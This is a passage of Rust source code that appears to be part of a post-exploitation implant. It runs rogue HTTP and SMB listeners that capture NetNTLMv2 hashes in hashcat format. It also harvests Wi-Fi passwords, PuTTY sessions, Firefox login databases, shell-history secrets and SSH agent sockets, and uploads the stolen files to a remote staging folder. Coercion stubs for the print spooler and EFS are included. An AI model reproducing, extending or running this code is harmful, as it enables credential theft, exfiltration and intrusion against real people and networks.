            let type3_b64 = _http_extract_ntlm(&req3)?;
            let type3_bytes = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, type3_b64.trim()).ok()?;

            let hash = _extract_ntlmv2_from_auth(&type3_bytes, &challenge)?;

            // Send 200 OK
            _http_send_200(stream);
            Some(hash)
        }
        Some(token) => {
            // Client sent NTLM auth on first request (Type1 directly)
            let type1_bytes = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, token.trim()).ok()?;
            if !type1_bytes.starts_with(b"NTLMSSP\x00") { return None; }
            let msg_type = u32::from_le_bytes([type1_bytes[8], type1_bytes[9], type1_bytes[10], type1_bytes[11]]);
            if msg_type != 1 { return None; }

            let type2 = _build_ntlmssp_challenge(&challenge);
            let type2_b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &type2);
            _http_send_401(stream, Some(&type2_b64))?;

            let req3 = _http_read_request(stream)?;
            let type3_b64 = _http_extract_ntlm(&req3)?;
            let type3_bytes = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, type3_b64.trim()).ok()?;

            let hash = _extract_ntlmv2_from_auth(&type3_bytes, &challenge)?;
            _http_send_200(stream);
            Some(hash)
        }
    }
}

/// Read an HTTP request from the stream. Returns the raw request as a String.
fn _http_read_request(stream: &mut std::net::TcpStream) -> Option<String> {
    use std::io::Read;
    let mut buf = [0u8; 4096];
    let n = stream.read(&mut buf).ok()?;
    if n == 0 { return None; }
    Some(String::from_utf8_lossy(&buf[..n]).to_string())
}

/// Extract the NTLM token from "Authorization: NTLM <base64>" header.
fn _http_extract_ntlm(request: &str) -> Option<String> {
    for line in request.lines() {
        let lower = line.to_lowercase();
        if lower.starts_with("authorization:") {
            let val = line["authorization:".len()..].trim();
            if let Some(token) = val.strip_prefix("NTLM ").or_else(|| val.strip_prefix("ntlm ")) {
                return Some(token.to_string());
            }
        }
    }
    None
}

/// Extract and decode Basic auth credentials. Returns formatted string with peer IP.
fn _http_extract_basic(request: &str, peer: &str) -> Option<String> {
    for line in request.lines() {
        let lower = line.to_lowercase();
        if lower.starts_with("authorization:") {
            let val = line["authorization:".len()..].trim();
            if let Some(token) = val.strip_prefix("Basic ").or_else(|| val.strip_prefix("basic ")) {
                let decoded = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, token.trim()).ok()?;
                let cred_str = String::from_utf8_lossy(&decoded);
                return Some(format!("[HTTP-Basic] {} (from {})", cred_str, peer));
            }
        }
    }
    None
}

/// Send HTTP 401 response. Advertises NTLM (preferred) + Basic as fallback.
fn _http_send_401(stream: &mut std::net::TcpStream, ntlm_token: Option<&str>) -> Option<()> {
    use std::io::Write;
    let ntlm_header = match ntlm_token {
        Some(token) => format!("WWW-Authenticate: NTLM {}\r\n", token),
        None        => "WWW-Authenticate: NTLM\r\n".to_string(),
    };
    let body = "<html><body><h1>401 Unauthorized</h1></body></html>";
    let resp = format!(
        "HTTP/1.1 401 Unauthorized\r\n\
         {}\
         WWW-Authenticate: Basic realm=\"Secured Area\"\r\n\
         Content-Type: text/html\r\n\
         Content-Length: {}\r\n\
         Connection: keep-alive\r\n\
         \r\n\
         {}",
        ntlm_header, body.len(), body
    );
    stream.write_all(resp.as_bytes()).ok()?;
    stream.flush().ok()?;
    Some(())
}

/// Send HTTP 200 OK response.
fn _http_send_200(stream: &mut std::net::TcpStream) {
    use std::io::Write;
    let body = "<html><body><h1>OK</h1></body></html>";
    let resp = format!(
        "HTTP/1.1 200 OK\r\n\
         Content-Type: text/html\r\n\
         Content-Length: {}\r\n\
         Connection: close\r\n\
         \r\n\
         {}",
        body.len(), body
    );
    let _ = stream.write_all(resp.as_bytes());
}

// ══════════════════════════════════════════════════════════════════════════════
// § SMB LISTENER — minimal SMB2 negotiate + NTLMSSP challenge/response
// ══════════════════════════════════════════════════════════════════════════════

fn _smb_listener_loop(listener: std::net::TcpListener, stop: Arc<std::sync::atomic::AtomicBool>, hashes: Arc<Mutex<Vec<String>>>) {
    use std::io::{Read, Write};
    use std::time::Duration;

    while !stop.load(std::sync::atomic::Ordering::Relaxed) {
        match listener.accept() {
            Ok((mut stream, _addr)) => {
                stream.set_read_timeout(Some(Duration::from_secs(10))).ok();
                stream.set_write_timeout(Some(Duration::from_secs(10))).ok();

                if let Some(hash) = _handle_smb_client(&mut stream) {
                    if let Ok(mut h) = hashes.lock() {
                        if h.len() >= LISTEN_MAX_HASHES { h.remove(0); }
                        h.push(hash);
                    }
                }
            }
            Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                // No connection pending — sleep briefly and retry
                std::thread::sleep(Duration::from_millis(500));
            }
            Err(_) => {
                std::thread::sleep(Duration::from_millis(100));
            }
        }
    }
}

/// Handle a single SMB client connection — perform minimal SMB2 negotiate +
/// NTLMSSP challenge-response to capture NetNTLMv2 hash.
fn _handle_smb_client(stream: &mut std::net::TcpStream) -> Option<String> {
    use std::io::{Read, Write};

    // Read NetBIOS session + SMB header
    let mut hdr_buf = [0u8; 4];
    stream.read_exact(&mut hdr_buf).ok()?;
    let msg_len = u32::from_be_bytes([0, hdr_buf[1], hdr_buf[2], hdr_buf[3]]) as usize;
    if msg_len > 65535 { return None; }

    let mut msg = vec![0u8; msg_len];
    stream.read_exact(&mut msg).ok()?;

    // Check for SMB1 negotiate (0xFF 'S' 'M' 'B') or SMB2 (0xFE 'S' 'M' 'B')
    if msg.len() < 4 { return None; }

    // Respond with SMB2 negotiate response that requests NTLMSSP
    let challenge = _random_challenge();

    // Send SMB2 Negotiate Response with NTLMSSP_CHALLENGE
    let neg_resp = _build_smb2_negotiate_response(&challenge);
    let nb_header = _netbios_header(neg_resp.len());
    stream.write_all(&nb_header).ok()?;
    stream.write_all(&neg_resp).ok()?;

    // If client sent SMB1 negotiate, we need to handle multi-step
    // For simplicity, support the common flow:
    // 1. Client: SMB2 Negotiate
    // 2. Server: SMB2 Negotiate Response (with NTLMSSP_NEGOTIATE hint)
    // 3. Client: Session Setup (NTLMSSP_NEGOTIATE)
    // 4. Server: Session Setup (NTLMSSP_CHALLENGE)
    // 5. Client: Session Setup (NTLMSSP_AUTH) ← hash is here

    // Read Session Setup Request 1 (NTLMSSP_NEGOTIATE)
    let mut hdr2 = [0u8; 4];
    if stream.read_exact(&mut hdr2).is_err() { return None; }
    let msg2_len = u32::from_be_bytes([0, hdr2[1], hdr2[2], hdr2[3]]) as usize;
    if msg2_len > 65535 { return None; }
    let mut msg2 = vec![0u8; msg2_len];
    if stream.read_exact(&mut msg2).is_err() { return None; }

    // Send NTLMSSP_CHALLENGE
    let challenge_resp = _build_session_setup_challenge(&challenge);
    let nb2 = _netbios_header(challenge_resp.len());
    stream.write_all(&nb2).ok()?;
    stream.write_all(&challenge_resp).ok()?;

    // Read Session Setup Request 2 (NTLMSSP_AUTH) — this has the hash
    let mut hdr3 = [0u8; 4];
    if stream.read_exact(&mut hdr3).is_err() { return None; }
    let msg3_len = u32::from_be_bytes([0, hdr3[1], hdr3[2], hdr3[3]]) as usize;
    if msg3_len > 65535 { return None; }
    let mut msg3 = vec![0u8; msg3_len];
    if stream.read_exact(&mut msg3).is_err() { return None; }

    // Extract NTLMSSP_AUTH from the message
    let hash = _extract_ntlmv2_from_auth(&msg3, &challenge)?;

    // Send STATUS_LOGON_FAILURE
    let fail_resp = _build_session_setup_failure();
    let nb3 = _netbios_header(fail_resp.len());
    stream.write_all(&nb3).ok()?;
    stream.write_all(&fail_resp).ok()?;

    Some(hash)
}

// ── SMB2 protocol helpers ────────────────────────────────────────────────────

fn _random_challenge() -> [u8; 8] {
    let mut buf = [0u8; 8];
    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut buf);
    buf
}

fn _netbios_header(payload_len: usize) -> [u8; 4] {
    let len = payload_len as u32;
    [0x00, (len >> 16) as u8, (len >> 8) as u8, len as u8]
}

/// Build a minimal SMB2 Negotiate Response that indicates NTLMSSP support.
fn _build_smb2_negotiate_response(_challenge: &[u8; 8]) -> Vec<u8> {
    // SMB2 header (64 bytes) + Negotiate Response (65 bytes min) + Security Buffer (NTLMSSP)
    let mut pkt = Vec::with_capacity(256);

    // ── SMB2 Header ──
    pkt.extend_from_slice(b"\xfeSMB");         // Protocol ID
    pkt.extend_from_slice(&64u16.to_le_bytes()); // Header length
    pkt.extend_from_slice(&[0u8; 2]);            // Credit charge
    pkt.extend_from_slice(&0u32.to_le_bytes());  // Status: SUCCESS
    pkt.extend_from_slice(&0u16.to_le_bytes());  // Command: NEGOTIATE (0)
    pkt.extend_from_slice(&1u16.to_le_bytes());  // Credits granted
    pkt.extend_from_slice(&0u32.to_le_bytes());  // Flags
    pkt.extend_from_slice(&0u32.to_le_bytes());  // Next command
    pkt.extend_from_slice(&0u64.to_le_bytes());  // Message ID
    pkt.extend_from_slice(&0u32.to_le_bytes());  // Reserved
    pkt.extend_from_slice(&0u32.to_le_bytes());  // Tree ID
    pkt.extend_from_slice(&0u64.to_le_bytes());  // Session ID
    pkt.extend_from_slice(&[0u8; 16]);           // Signature

    // ── SMB2 Negotiate Response body ──
    let sec_buf = _build_ntlmssp_negotiate_token();
    let body_offset = 64 + 65; // after header + fixed negotiate response fields
    let sec_offset = body_offset as u16;

    pkt.extend_from_slice(&65u16.to_le_bytes());     // Structure size
    pkt.extend_from_slice(&1u16.to_le_bytes());      // Security mode: signing enabled
    pkt.extend_from_slice(&0x0311u16.to_le_bytes()); // Dialect: SMB 3.1.1
    pkt.extend_from_slice(&0u16.to_le_bytes());      // NegotiateContextCount
    pkt.extend_from_slice(&[0u8; 16]);               // Server GUID
    pkt.extend_from_slice(&0u32.to_le_bytes());      // Capabilities
    pkt.extend_from_slice(&65536u32.to_le_bytes());  // Max transact size
    pkt.extend_from_slice(&65536u32.to_le_bytes());  // Max read size
    pkt.extend_from_slice(&65536u32.to_le_bytes());  // Max write size
    pkt.extend_from_slice(&0u64.to_le_bytes());      // System time
    pkt.extend_from_slice(&0u64.to_le_bytes());      // Server start time
    pkt.extend_from_slice(&(sec_offset).to_le_bytes()); // Security buffer offset
    pkt.extend_from_slice(&(sec_buf.len() as u16).to_le_bytes()); // Security buffer length
    pkt.extend_from_slice(&0u32.to_le_bytes());      // NegotiateContextOffset

    pkt.extend_from_slice(&sec_buf);

    pkt
}

/// Build minimal NTLMSSP negotiate token (indicates NTLM support).
fn _build_ntlmssp_negotiate_token() -> Vec<u8> {
    // Minimal SPNEGO wrapper indicating NTLMSSP
    // For simplicity, return a raw NTLMSSP negotiate hint
    let mut buf = Vec::new();
    // NTLMSSP signature
    buf.extend_from_slice(b"NTLMSSP\x00");
    // Message type: NEGOTIATE (1)
    buf.extend_from_slice(&1u32.to_le_bytes());
    // Negotiate flags
    let flags: u32 = 0x00028233; // NTLM, Unicode, Request Target, Seal, Sign
    buf.extend_from_slice(&flags.to_le_bytes());
    // Domain name fields (empty)
    buf.extend_from_slice(&[0u8; 8]);
    // Workstation fields (empty)
    buf.extend_from_slice(&[0u8; 8]);
    buf
}

/// Build Session Setup Response with NTLMSSP_CHALLENGE.
fn _build_session_setup_challenge(challenge: &[u8; 8]) -> Vec<u8> {
    let mut pkt = Vec::with_capacity(256);

    // ── SMB2 Header ──
    pkt.extend_from_slice(b"\xfeSMB");
    pkt.extend_from_slice(&64u16.to_le_bytes());
    pkt.extend_from_slice(&[0u8; 2]);
    // Status: STATUS_MORE_PROCESSING_REQUIRED (0xC0000016)
    pkt.extend_from_slice(&0xC0000016u32.to_le_bytes());
    pkt.extend_from_slice(&1u16.to_le_bytes());  // Command: SESSION_SETUP
    pkt.extend_from_slice(&1u16.to_le_bytes());  // Credits
    pkt.extend_from_slice(&0u32.to_le_bytes());  // Flags
    pkt.extend_from_slice(&0u32.to_le_bytes());  // Next command
    pkt.extend_from_slice(&1u64.to_le_bytes());  // Message ID
    pkt.extend_from_slice(&0u32.to_le_bytes());  // Reserved
    pkt.extend_from_slice(&0u32.to_le_bytes());  // Tree ID
    pkt.extend_from_slice(&1u64.to_le_bytes());  // Session ID
    pkt.extend_from_slice(&[0u8; 16]);           // Signature

    // ── Session Setup Response body ──
    let ntlm_challenge = _build_ntlmssp_challenge(challenge);
    let body_start = 64 + 9; // header + fixed session setup response size

    pkt.extend_from_slice(&9u16.to_le_bytes());   // Structure size
    pkt.extend_from_slice(&0u16.to_le_bytes());   // Session flags
    pkt.extend_from_slice(&(body_start as u16).to_le_bytes()); // Security buffer offset
    pkt.extend_from_slice(&(ntlm_challenge.len() as u16).to_le_bytes()); // Security buffer length
    // Padding byte for alignment (structure size = 9 but we wrote 8 bytes of fields)
    pkt.push(0);

    pkt.extend_from_slice(&ntlm_challenge);

    pkt
}

/// Build NTLMSSP_CHALLENGE message.
fn _build_ntlmssp_challenge(server_challenge: &[u8; 8]) -> Vec<u8> {
    let mut buf = Vec::with_capacity(128);

    // NTLMSSP signature
    buf.extend_from_slice(b"NTLMSSP\x00");
    // Message type: CHALLENGE (2)
    buf.extend_from_slice(&2u32.to_le_bytes());

    // Target name (empty for now)
    let target_info_offset = 56u32; // offset from start of NTLMSSP message
    buf.extend_from_slice(&0u16.to_le_bytes());   // TargetNameLen
    buf.extend_from_slice(&0u16.to_le_bytes());   // TargetNameMaxLen
    buf.extend_from_slice(&target_info_offset.to_le_bytes()); // TargetNameOffset

    // Negotiate flags
    let flags: u32 = 0x00628233; // NTLM, Unicode, Target Info, Target Type Domain, Seal, Sign, 56-bit
    buf.extend_from_slice(&flags.to_le_bytes());

    // Server challenge (8 bytes)
    buf.extend_from_slice(server_challenge);

    // Reserved (8 bytes)
    buf.extend_from_slice(&[0u8; 8]);

    // Target info (empty — len/maxlen/offset)
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&0u32.to_le_bytes());

    buf
}

/// Build Session Setup Response with STATUS_LOGON_FAILURE.
fn _build_session_setup_failure() -> Vec<u8> {
    let mut pkt = Vec::with_capacity(80);

    // ── SMB2 Header ──
    pkt.extend_from_slice(b"\xfeSMB");
    pkt.extend_from_slice(&64u16.to_le_bytes());
    pkt.extend_from_slice(&[0u8; 2]);
    // Status: STATUS_LOGON_FAILURE (0xC000006D)
    pkt.extend_from_slice(&0xC000006Du32.to_le_bytes());
    pkt.extend_from_slice(&1u16.to_le_bytes());  // Command: SESSION_SETUP
    pkt.extend_from_slice(&0u16.to_le_bytes());  // Credits
    pkt.extend_from_slice(&0u32.to_le_bytes());  // Flags
    pkt.extend_from_slice(&0u32.to_le_bytes());  // Next command
    pkt.extend_from_slice(&2u64.to_le_bytes());  // Message ID
    pkt.extend_from_slice(&0u32.to_le_bytes());  // Reserved
    pkt.extend_from_slice(&0u32.to_le_bytes());  // Tree ID
    pkt.extend_from_slice(&1u64.to_le_bytes());  // Session ID
    pkt.extend_from_slice(&[0u8; 16]);           // Signature

    // Session Setup Response (empty security buffer)
    pkt.extend_from_slice(&9u16.to_le_bytes());  // Structure size
    pkt.extend_from_slice(&0u16.to_le_bytes());  // Session flags
    pkt.extend_from_slice(&0u16.to_le_bytes());  // Security buffer offset
    pkt.extend_from_slice(&0u16.to_le_bytes());  // Security buffer length
    pkt.push(0); // pad

    pkt
}

/// Extract NetNTLMv2 hash from NTLMSSP_AUTH message in hashcat format.
fn _extract_ntlmv2_from_auth(msg: &[u8], challenge: &[u8; 8]) -> Option<String> {
    // Find NTLMSSP signature in the message
    let ntlmssp_offset = _find_bytes(msg, b"NTLMSSP\x00")?;
    let ntlm = &msg[ntlmssp_offset..];

    if ntlm.len() < 88 { return None; }

    // Verify message type = 3 (AUTH)
    let msg_type = u32::from_le_bytes([ntlm[8], ntlm[9], ntlm[10], ntlm[11]]);
    if msg_type != 3 { return None; }

    // Parse fields (each is len:u16, maxlen:u16, offset:u32)
    let _lm_len     = u16::from_le_bytes([ntlm[12], ntlm[13]]) as usize;
    let _lm_offset  = u32::from_le_bytes([ntlm[16], ntlm[17], ntlm[18], ntlm[19]]) as usize;
    let nt_len      = u16::from_le_bytes([ntlm[20], ntlm[21]]) as usize;
    let nt_offset   = u32::from_le_bytes([ntlm[24], ntlm[25], ntlm[26], ntlm[27]]) as usize;
    let domain_len  = u16::from_le_bytes([ntlm[28], ntlm[29]]) as usize;
    let domain_off  = u32::from_le_bytes([ntlm[32], ntlm[33], ntlm[34], ntlm[35]]) as usize;
    let user_len    = u16::from_le_bytes([ntlm[36], ntlm[37]]) as usize;
    let user_off    = u32::from_le_bytes([ntlm[40], ntlm[41], ntlm[42], ntlm[43]]) as usize;

    // Bounds check
    if nt_offset + nt_len > ntlm.len() { return None; }
    if user_off + user_len > ntlm.len() { return None; }
    if domain_off + domain_len > ntlm.len() { return None; }

    // NTLMv2: NT response = 16-byte NTProofStr + variable blob
    if nt_len < 24 { return None; } // Must have at least NTProofStr (16) + some blob

    let nt_response = &ntlm[nt_offset..nt_offset + nt_len];
    let nt_proof_str = &nt_response[..16];
    let nt_blob = &nt_response[16..];

    // Decode UTF-16LE strings
    let username = _utf16le_to_string(&ntlm[user_off..user_off + user_len]);
    let domain = _utf16le_to_string(&ntlm[domain_off..domain_off + domain_len]);

    // Format: user::domain:challenge:NTProofStr:blob
    // hashcat -m 5600 format
    Some(format!("{}::{}:{}:{}:{}",
        username,
        domain,
        hex::encode(challenge),
        hex::encode(nt_proof_str),
        hex::encode(nt_blob),
    ))
}

// ══════════════════════════════════════════════════════════════════════════════
// § INTERNAL HELPERS
// ══════════════════════════════════════════════════════════════════════════════

fn _find_bytes(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    haystack.windows(needle.len()).position(|w| w == needle)
}

fn _utf16le_to_string(data: &[u8]) -> String {
    let chars: Vec<u16> = data.chunks_exact(2)
        .map(|c| u16::from_le_bytes([c[0], c[1]]))
        .collect();
    String::from_utf16_lossy(&chars)
}

fn _rand_hex(n: usize) -> String {
    let mut buf = vec![0u8; n];
    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut buf);
    hex::encode(buf)
}

fn _fmt_bytes(b: u64) -> String {
    if b < 1024 { format!("{} B", b) }
    else if b < 1024 * 1024 { format!("{:.1} KB", b as f64 / 1024.0) }
    else { format!("{:.1} MB", b as f64 / (1024.0 * 1024.0)) }
}

fn _fmt_duration(d: std::time::Duration) -> String {
    let secs = d.as_secs();
    if secs < 60 { format!("{}s", secs) }
    else if secs < 3600 { format!("{}m {}s", secs / 60, secs % 60) }
    else if secs < 86400 { format!("{}h {}m", secs / 3600, (secs % 3600) / 60) }
    else { format!("{}d {}h", secs / 86400, (secs % 86400) / 3600) }
}

/// Stage a single file to cloud — returns bytes staged or None if not found/readable.
fn _stage_file(path: &str, label: &str, state: &Arc<AgentState>, transport: &SharedTransport) -> Option<u64> {
    let data = std::fs::read(path).ok()?;
    if data.is_empty() { return None; }
    let dest = format!("{}/staging/creds_{}_{}.bin",
        state.folder_path.trim_end_matches('/'), label, _rand_hex(3));
    if transport.upload(&dest, &data) {
        Some(data.len() as u64)
    } else {
        None
    }
}

/// Stage all files in a directory.
fn _stage_dir_files(dir: &str, prefix: &str, state: &Arc<AgentState>, transport: &SharedTransport) -> (u32, u64) {
    let mut count = 0u32;
    let mut bytes = 0u64;
    if let Ok(entries) = std::fs::read_dir(dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_file() {
                if let Ok(data) = std::fs::read(&path) {
                    if data.is_empty() { continue; }
                    let name = path.file_name().unwrap_or_default().to_string_lossy();
                    let dest = format!("{}/staging/creds_{}_{}_{}.bin",
                        state.folder_path.trim_end_matches('/'), prefix, name, _rand_hex(2));
                    if transport.upload(&dest, &data) {
                        count += 1;
                        bytes += data.len() as u64;
                    }
                }
            }
        }
    }
    (count, bytes)
}

/// Stage files matching a glob pattern in a directory.
fn _stage_glob(dir: &str, pattern: &str, prefix: &str, state: &Arc<AgentState>, transport: &SharedTransport) -> (u32, u64) {
    let mut count = 0u32;
    let mut bytes = 0u64;
    let glob_pattern = format!("{}/{}", dir, pattern);
    if let Ok(paths) = glob::glob(&glob_pattern) {
        for entry in paths.flatten() {
            if entry.is_file() {
                if let Ok(data) = std::fs::read(&entry) {
                    if data.is_empty() { continue; }
                    let name = entry.file_name().unwrap_or_default().to_string_lossy();
                    let dest = format!("{}/staging/creds_{}_{}_{}.bin",
                        state.folder_path.trim_end_matches('/'), prefix, name, _rand_hex(2));
                    if transport.upload(&dest, &data) {
                        count += 1;
                        bytes += data.len() as u64;
                    }
                }
            }
        }
    }
    (count, bytes)
}

// ── Platform-specific helpers ────────────────────────────────────────────────

#[cfg(windows)]
fn _get_user_sid() -> Option<String> {
    // Use whoami /user to get the SID
    let output = std::process::Command::new("cmd")
        .args(["/C", "whoami /user /fo csv /nh"])
        .output().ok()?;
    let out = String::from_utf8_lossy(&output.stdout);
    // Format: "DOMAIN\user","S-1-5-..."
    out.split('"').nth(3).map(|s| s.to_string())
}

#[cfg(windows)]
fn _harvest_wifi_windows() -> String {
    let output = std::process::Command::new("cmd")
        .args(["/C", "netsh wlan show profiles"])
        .output();
    let profiles_output = match output {
        Ok(o) => String::from_utf8_lossy(&o.stdout).to_string(),
        Err(_) => return String::new(),
    };

    let mut result = String::new();
    for line in profiles_output.lines() {
        if let Some(name) = line.strip_prefix("    All User Profile     : ") {
            let name = name.trim();
            let detail = std::process::Command::new("cmd")
                .args(["/C", &format!("netsh wlan show profile name=\"{}\" key=clear", name)])
                .output();
            if let Ok(d) = detail {
                let detail_str = String::from_utf8_lossy(&d.stdout);
                for dl in detail_str.lines() {
                    if dl.contains("Key Content") {
                        let key = dl.split(':').nth(1).unwrap_or("").trim();
                        result.push_str(&format!("    {} → {}\n", name, key));
                        break;
                    }
                }
            }
        }
    }
    result
}

#[cfg(windows)]
fn _harvest_putty() -> String {
    let output = std::process::Command::new("cmd")
        .args(["/C", "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions"])
        .output();
    match output {
        Ok(o) if o.status.success() => {
            let out = String::from_utf8_lossy(&o.stdout);
            let mut result = String::new();
            for line in out.lines() {
                if line.contains("HKEY_CURRENT_USER") {
                    let session_name = line.rsplit('\\').next().unwrap_or("");
                    // Query hostname and port
                    let detail = std::process::Command::new("cmd")
                        .args(["/C", &format!("reg query \"{}\" /v HostName", line.trim())])
                        .output();
                    if let Ok(d) = detail {
                        let ds = String::from_utf8_lossy(&d.stdout);
                        if let Some(host_line) = ds.lines().find(|l| l.contains("HostName")) {
                            let host = host_line.split_whitespace().last().unwrap_or("?");
                            result.push_str(&format!("    {} → {}\n", session_name, host));
                        }
                    }
                }
            }
            result
        }
        _ => String::new(),
    }
}

#[cfg(windows)]
fn _stage_firefox(ff_dir: &str, state: &Arc<AgentState>, transport: &SharedTransport) -> (u32, u64) {
    let mut count = 0u32;
    let mut bytes = 0u64;
    let pattern = format!("{}\\*", ff_dir);
    if let Ok(entries) = glob::glob(&pattern) {
        for entry in entries.flatten() {
            if entry.is_dir() {
                let logins = entry.join("logins.json");
                let key4 = entry.join("key4.db");
                if logins.exists() {
                    if let Some(b) = _stage_file(&logins.display().to_string(), "ff_logins", state, transport) {
                        count += 1; bytes += b;
                    }
                }
                if key4.exists() {
                    if let Some(b) = _stage_file(&key4.display().to_string(), "ff_key4", state, transport) {
                        count += 1; bytes += b;
                    }
                }
            }
        }
    }
    (count, bytes)
}

#[cfg(unix)]
fn _stage_firefox(ff_dir: &str, state: &Arc<AgentState>, transport: &SharedTransport) -> (u32, u64) {
    let mut count = 0u32;
    let mut bytes = 0u64;
    let pattern = format!("{}/*", ff_dir);
    if let Ok(entries) = glob::glob(&pattern) {
        for entry in entries.flatten() {
            if entry.is_dir() {
                let logins = entry.join("logins.json");
                let key4 = entry.join("key4.db");
                if logins.exists() {
                    if let Some(b) = _stage_file(&logins.display().to_string(), "ff_logins", state, transport) {
                        count += 1; bytes += b;
                    }
                }
                if key4.exists() {
                    if let Some(b) = _stage_file(&key4.display().to_string(), "ff_key4", state, transport) {
                        count += 1; bytes += b;
                    }
                }
            }
        }
    }
    (count, bytes)
}

#[cfg(windows)]
fn _is_system_or_admin() -> bool {
    let output = std::process::Command::new("cmd")
        .args(["/C", "whoami /priv"])
        .output();
    match output {
        Ok(o) => {
            let s = String::from_utf8_lossy(&o.stdout);
            s.contains("SeDebugPrivilege") || s.contains("SeTakeOwnershipPrivilege")
        }
        Err(_) => false,
    }
}

#[cfg(unix)]
fn _get_uid() -> u32 {
    unsafe { libc::getuid() }
}

#[cfg(windows)]
fn _coerce_spoolsample_local() -> Result<String, String> {
    // Create a named pipe and trigger MS-RPRN coercion locally
    // This is a simplified implementation — in production would use
    // proper named pipe + RPC binding to the local spooler service
    Err("SpoolSample coercion not yet implemented for Rust agent".to_string())
}

#[cfg(windows)]
fn _coerce_efsrpc_local() -> Result<String, String> {
    Err("EfsRpc coercion not yet implemented for Rust agent".to_string())
}

// ── Linux SSH Agent helpers ──────────────────────────────────────────────────

#[cfg(unix)]
struct SshAgentInfo {
    user: String,
    pid:  u32,
    sock: String,
}

#[cfg(unix)]
struct SshKeyInfo {
    key_type: String,
    comment:  String,
}

#[cfg(unix)]
fn _find_ssh_agents() -> Vec<SshAgentInfo> {
    let mut agents = Vec::new();

    // Scan /proc for SSH_AUTH_SOCK in environ
    let proc_dir = match std::fs::read_dir("/proc") {
        Ok(d) => d,
        Err(_) => return agents,
    };

    let mut seen_socks = std::collections::HashSet::new();

    for entry in proc_dir.flatten() {
        let name = entry.file_name().to_string_lossy().to_string();
        if !name.chars().all(|c| c.is_ascii_digit()) { continue; }

        let pid: u32 = match name.parse() {
            Ok(p) => p,
            Err(_) => continue,
        };

        let environ_path = format!("/proc/{}/environ", pid);
        let environ = match std::fs::read(&environ_path) {
            Ok(d) => d,
            Err(_) => continue,
        };

        // Parse null-separated environment variables
        for var in environ.split(|&b| b == 0) {
            let var_str = String::from_utf8_lossy(var);
            if let Some(sock) = var_str.strip_prefix("SSH_AUTH_SOCK=") {
                if seen_socks.contains(sock) { continue; }
                if !std::path::Path::new(sock).exists() { continue; }

                // Get user from /proc/pid/status
                let status_path = format!("/proc/{}/status", pid);
                let user = std::fs::read_to_string(&status_path)
                    .ok()
                    .and_then(|s| {
                        s.lines()
                            .find(|l| l.starts_with("Uid:"))
                            .and_then(|l| l.split_whitespace().nth(1))
                            .and_then(|uid_str| uid_str.parse::<u32>().ok())
                            .map(|uid| _uid_to_username(uid))
                    })
                    .unwrap_or_else(|| "?".to_string());

                seen_socks.insert(sock.to_string());
                agents.push(SshAgentInfo {
                    user,
                    pid,
                    sock: sock.to_string(),
                });
            }
        }
    }

    agents
}

#[cfg(unix)]
fn _uid_to_username(uid: u32) -> String {
    // Read /etc/passwd for uid → username mapping
    if let Ok(passwd) = std::fs::read_to_string("/etc/passwd") {
        for line in passwd.lines() {
            let parts: Vec<&str> = line.split(':').collect();
            if parts.len() >= 3 {
                if let Ok(file_uid) = parts[2].parse::<u32>() {
                    if file_uid == uid {
                        return parts[0].to_string();
                    }
                }
            }
        }
    }
    format!("uid:{}", uid)
}

#[cfg(unix)]
fn _ssh_agent_list_keys(sock_path: &str) -> Result<Vec<SshKeyInfo>, String> {
    use std::io::{Read, Write};
    use std::os::unix::net::UnixStream;

    let mut stream = UnixStream::connect(sock_path)
        .map_err(|e| format!("connect: {}", e))?;
    stream.set_read_timeout(Some(std::time::Duration::from_secs(5))).ok();

    // SSH_AGENTC_REQUEST_IDENTITIES = 11
    let request: [u8; 5] = [0, 0, 0, 1, 11];
    stream.write_all(&request).map_err(|e| format!("write: {}", e))?;

    // Read response length (4 bytes)
    let mut len_buf = [0u8; 4];
    stream.read_exact(&mut len_buf).map_err(|e| format!("read len: {}", e))?;
    let resp_len = u32::from_be_bytes(len_buf) as usize;
    if resp_len > 1024 * 1024 { return Err("response too large".to_string()); }

    let mut resp = vec![0u8; resp_len];
    stream.read_exact(&mut resp).map_err(|e| format!("read body: {}", e))?;

    // Response: type (1 byte) = SSH_AGENT_IDENTITIES_ANSWER (12)
    if resp.is_empty() || resp[0] != 12 {
        return Err("unexpected response type".to_string());
    }

    // Number of keys (4 bytes)
    if resp.len() < 5 { return Err("short response".to_string()); }
    let nkeys = u32::from_be_bytes([resp[1], resp[2], resp[3], resp[4]]) as usize;

    let mut keys = Vec::new();
    let mut offset = 5;

    for _ in 0..nkeys {
        if offset + 4 > resp.len() { break; }
        let blob_len = u32::from_be_bytes([resp[offset], resp[offset+1], resp[offset+2], resp[offset+3]]) as usize;
        offset += 4;
        if offset + blob_len > resp.len() { break; }

        // Extract key type from the blob
        let key_type = if blob_len >= 4 {
            let kt_len = u32::from_be_bytes([resp[offset], resp[offset+1], resp[offset+2], resp[offset+3]]) as usize;
            if kt_len + 4 <= blob_len {
                String::from_utf8_lossy(&resp[offset+4..offset+4+kt_len]).to_string()
            } else {
                "unknown".to_string()
            }
        } else {
            "unknown".to_string()
        };

        offset += blob_len;

        // Comment string
        if offset + 4 > resp.len() { break; }
        let comment_len = u32::from_be_bytes([resp[offset], resp[offset+1], resp[offset+2], resp[offset+3]]) as usize;
        offset += 4;
        let comment = if offset + comment_len <= resp.len() {
            String::from_utf8_lossy(&resp[offset..offset+comment_len]).to_string()
        } else {
            String::new()
        };
        offset += comment_len;

        keys.push(SshKeyInfo { key_type, comment });
    }

    Ok(keys)
}

#[cfg(unix)]
fn _grep_history_secrets(home: &str) -> String {
    let hist_files = [
        format!("{}/.bash_history", home),
        format!("{}/.zsh_history", home),
    ];
    let patterns = ["password", "token", "secret", "api_key", "apikey",
                    "AWS_ACCESS", "AWS_SECRET", "PRIVATE_KEY", "Bearer"];

    let mut matches = Vec::new();
    for hf in &hist_files {
        if let Ok(content) = std::fs::read_to_string(hf) {
            for line in content.lines() {
                let lower = line.to_lowercase();
